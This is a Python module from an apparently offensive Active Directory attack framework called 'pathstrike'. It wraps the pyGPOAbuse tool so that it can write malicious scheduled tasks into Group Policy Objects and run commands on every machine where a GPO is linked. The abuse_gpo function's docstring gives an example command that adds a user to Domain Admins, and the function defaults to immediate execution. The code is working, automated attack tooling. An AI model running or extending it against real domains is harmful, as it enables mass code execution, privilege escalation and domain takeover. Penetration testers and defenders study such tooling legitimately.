"""Async subprocess wrapper for pyGPOAbuse.

pyGPOAbuse creates malicious scheduled tasks inside Group Policy Objects
by writing ``ScheduledTasks.xml`` to the GPO's SYSVOL share, updating
``gpt.ini``, and registering the required extension GUIDs — achieving
code execution on all machines where the GPO is linked.

Every public function returns a standardised result dict::

    {
        "success": bool,
        "output": str,          # raw stdout
        "error": str | None,    # stderr or exception message
    }
"""

from __future__ import annotations

import asyncio
import logging
import re
import shlex
from typing import Any

logger = logging.getLogger("pathstrike.tools.pygpoabuse")

# Regex to extract a GUID (with braces) from a GPO Distinguished Name.
_GPO_GUID_RE = re.compile(
    r"\{[0-9a-fA-F]{8}-(?:[0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}\}"
)


# ---------------------------------------------------------------------------
# Core runner
# ---------------------------------------------------------------------------


async def run_pygpoabuse(
    args: list[str],
    timeout: int = 60,
) -> dict[str, Any]:
    """Run pyGPOAbuse and return captured output.

    The tool is invoked as ``pygpoabuse [args]`` — the entry-point must be
    on ``$PATH`` (installed via ``pip install pygpoabuse``).

    Args:
        args: CLI arguments.
        timeout: Maximum seconds to wait (SMB ops can be slow).

    Returns:
        Standardised result dict.
    """
    cmd = ["pygpoabuse", *args]
    logger.debug("Executing: %s", " ".join(shlex.quote(c) for c in cmd))

    result: dict[str, Any] = {
        "success": False,
        "output": "",
        "error": None,
        "tool": "pygpoabuse",
        "command": " ".join(shlex.quote(c) for c in cmd),
    }

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout_bytes, stderr_bytes = await asyncio.wait_for(
            proc.communicate(), timeout=timeout
        )

        stdout = stdout_bytes.decode("utf-8", errors="replace").strip()
        stderr = stderr_bytes.decode("utf-8", errors="replace").strip()

        result["output"] = stdout
        result["stderr"] = stderr
        result["return_code"] = proc.returncode

        if proc.returncode != 0:
            result["error"] = stderr or f"pygpoabuse exited with code {proc.returncode}"
            logger.error(
                "pygpoabuse failed (rc=%d): %s",
                proc.returncode,
                result["error"],
            )
            return result

        result["success"] = True
        logger.debug("pygpoabuse succeeded (%d bytes output)", len(stdout))

    except asyncio.TimeoutError:
        result["error"] = f"pygpoabuse timed out after {timeout}s"
        result["error_type"] = "timeout"
        logger.error(result["error"])
    except FileNotFoundError:
        result["error"] = (
            "pygpoabuse not found. Install via: pip install pygpoabuse"
        )
        result["error_type"] = "tool_not_found"
        logger.error(result["error"])
    except OSError as exc:
        result["error"] = f"OS error launching pygpoabuse: {exc}"
        result["error_type"] = "os_error"
        logger.error(result["error"])

    return result


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def extract_gpo_guid(gpo_dn: str) -> str | None:
    """Extract the ``{GUID}`` from a GPO Distinguished Name.

    Example::

        >>> extract_gpo_guid(
        ...     "CN={AC8318BF-A5A0-48CC-BFB1-782E3B96789A},"
        ...     "CN=Policies,CN=System,DC=north,DC=sevenkingdoms,DC=local"
        ... )
        '{AC8318BF-A5A0-48CC-BFB1-782E3B96789A}'

    Returns:
        The GUID string (with braces), or ``None`` if not found.
    """
    match = _GPO_GUID_RE.search(gpo_dn)
    return match.group(0) if match else None


# ---------------------------------------------------------------------------
# Convenience wrapper
# ---------------------------------------------------------------------------


async def abuse_gpo(
    target_string: str,
    auth_flags: list[str],
    gpo_id: str,
    dc_ip: str,
    command: str,
    taskname: str = "PathStrike",
    force: bool = True,
    description: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Create a malicious scheduled task inside a GPO via pyGPOAbuse.

    Args:
        target_string: Impacket-style ``DOMAIN/user:password`` string.
        auth_flags: Additional auth flags (``-hashes``, ``-k``, etc.).
        gpo_id: GPO GUID including braces, e.g. ``"{AC8318BF-...}"``.
        dc_ip: Domain Controller IP address.
        command: Command to execute on targets (e.g.
            ``"net group 'Domain Admins' jdoe /add /domain"``).
        taskname: Display name for the scheduled task.
        force: If ``True``, pass ``-f`` for immediate execution.
        description: Optional task description.
        timeout: Maximum seconds to wait.

    Returns:
        Standardised result dict.
    """
    args = [
        target_string,
        "-gpo-id", gpo_id,
        "-command", command,
        "-taskname", taskname,
    ]

    # Add -dc-ip only if not already in auth_flags.
    if "-dc-ip" not in auth_flags:
        args.extend(["-dc-ip", dc_ip])

    if force:
        args.append("-f")

    if description:
        args.extend(["-description", description])

    # Append auth flags last (e.g. -hashes, -k, -no-pass, -aesKey).
    args.extend(auth_flags)

    return await run_pygpoabuse(args, timeout=timeout)
